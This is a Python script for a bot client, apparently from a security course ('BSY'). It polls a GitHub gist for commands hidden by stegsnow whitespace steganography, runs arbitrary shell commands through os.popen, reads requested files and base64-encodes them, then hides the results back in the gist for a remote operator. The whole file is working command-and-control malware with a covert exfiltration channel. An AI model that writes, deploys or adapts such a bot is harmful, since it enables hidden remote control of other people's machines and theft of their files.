import os
import time
import base64

##### EDITABLE USER VARIABLES #######################
GIST_ID = "799938c0850a634dfe9ce73436a00de0" #ID of github.gist
BOT_I = 1

INSTALL_TOOLS = True # Are gh and stegsnow already installed
LOGIN = True # login needed

################################################

# used filenames
coverage_fn  = 'short1.txt'
coveragel_fn  = 'text1.txt'
command_fn = 'example0.txt'
response_fn = f'example{BOT_I}.txt'
temp_fn = 'com.txt'

#known commands
commands = ['init', 'alive', 'w', 'ls', 'id', 'cat', 'echo', 'q', 'cp', 'ex']
responses = ['init', 'ack']

def install_tools():
    """
    function installing neccessary tools
    """
    print("=> Installing necessary tools..")
    ret = os.popen(f'gh').read().split()
    if not ret or ret[0] == "bash:": # gh not installed yet
        os.system(f'curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo dd of=/usr/share/keyrings/githubcli-archive-keyring.gpg')
        os.system('echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main" | sudo tee /etc/apt/sources.list.d/github-cli.list > /dev/null')
        os.system('sudo apt update')
        os.system('sudo apt install gh')
    print("\tGH installed.")
    ret = os.popen(f'stegsnow -h').read().split()
    if not ret or ret[0] == "bash:": # stegsnow not installed yet
        os.system(f'sudo apt-get install stegsnow')
    print("\tStegsnow installed.")


if __name__ == '__main__':

    print(f" ___________________ \n\nWelcome to the BSY slave bot {BOT_I} interface communicating at gist {GIST_ID}. \n"\
    "This cli is read-only, but the parameters as bot id, filenames or github gist id can be changed in the source code.\n ___________________ \n")

    if INSTALL_TOOLS:
        install_tools()

    if LOGIN:
        print("=> Logging into gist.github.")
        os.system(f'gh auth login --with-token < key.txt')


    os.system(f'stegsnow -C -m "{responses[0]}" {coverage_fn} {response_fn} 2> steg.out') # push init response to start communication and remove responses from previous usage
    os.system(f"gh gist edit {GIST_ID} -a {response_fn}")

    os.system(f"gh gist view {GIST_ID} -f {command_fn} > {temp_fn}") # get the last command from master
    prev_command = os.popen(f"stegsnow -C {temp_fn}").read()
    print("Waiting for commands..")

    while True: # waiting for new command
        os.system(f"gh gist view {GIST_ID} -f {command_fn} > {temp_fn}") # get the command
        command = os.popen(f"stegsnow -C {temp_fn}").read()
        cm_parts = command.split()
        if command and (cm_parts[0] == str(BOT_I) or cm_parts[0] == 'a') and cm_parts[1] != 'init' and prev_command != command: # if there is a new command and it is not init, execute it
            print(f"Received command {command}.")

            if cm_parts[1] in commands: # known command
                print(f"Performing the command {cm_parts[1]}..")

                cf = coverage_fn
                quit = False
                if cm_parts[1]=='q': # quit
                    output = 'ack'
                    quit = True
                elif cm_parts[1]=='alive': #alive check
                    output = 'ack'
                elif cm_parts[1]=='ex': # execute
                    output = os.popen(f"{cm_parts[2]}").read()
                elif cm_parts[1]=='cp': # copy file = zip it, convert to bytes, bytes to chars and hide
                    fd = open(cm_parts[2], 'rb')
                    output = base64.b64encode(fd.read()).decode('utf-8')
                    fd.close()
                    cf = coveragel_fn
                else: # other command
                    output = os.popen(f"{' '.join(cm_parts[1:])}").read()

                os.system(f'stegsnow -C -m "{output}" {cf} {response_fn} 2> steg.out') # send response
                os.system(f"gh gist edit {GIST_ID} -a {response_fn}")

                print("Command executed, waiting for acknowledgement..")

                while True:
                    os.system(f"gh gist view {GIST_ID} -f {command_fn} > {temp_fn}") # get the command
                    command = os.popen(f"stegsnow -C {temp_fn}").read()
                    cm_parts = command.split()
                    if (cm_parts[0] == str(BOT_I) or cm_parts[0] == 'a') and cm_parts[1] == 'init':
                        print("Acknowledgement received.")
                        os.system(f'stegsnow -C -m "init" {coverage_fn} {response_fn} 2> steg.out') # push again init response to close the channel and prepare it for further communication
                        os.system(f"gh gist edit {GIST_ID} -a {response_fn}")
                        break
                if quit: #quit command
                    os.system(f"rm {response_fn} && rm {temp_fn}")
                    break

            else:
                print("Received invalid command.")
            print("Waiting for commands..")
        prev_command = command[:]
        time.sleep(0.1)

    print("Ending activity.")
